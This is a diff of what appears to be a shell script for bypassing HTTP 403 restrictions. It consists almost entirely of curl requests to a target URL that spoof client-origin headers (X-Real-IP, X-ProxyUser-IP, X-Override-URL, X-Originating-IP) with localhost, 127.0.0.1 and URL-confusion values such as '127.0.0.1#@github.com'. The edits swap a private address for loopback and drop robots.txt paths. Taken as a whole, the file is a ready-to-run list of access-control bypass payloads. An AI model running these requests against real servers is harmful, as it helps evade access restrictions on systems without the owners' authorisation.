+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127.0.0.1:80@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127.0.0.1:80@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127.0.0.1:80@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -408,7 +408,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -422,8 +422,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: http://127.0.0.1:80 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -444,23 +444,23 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: 127.0.0.1'
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: 127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://127.0.0.1:80@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://127.0.0.1:80@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://127.0.0.1:80@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -471,7 +471,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -485,8 +485,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: http://127.0.0.1:80 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -508,22 +508,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: 127.0
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-ProxyUser-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -534,7 +534,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -548,8 +548,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http:
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -571,22 +571,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: 127.0
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Override-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -597,7 +597,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: htt
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -611,8 +611,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: htt
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Originating-IP: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
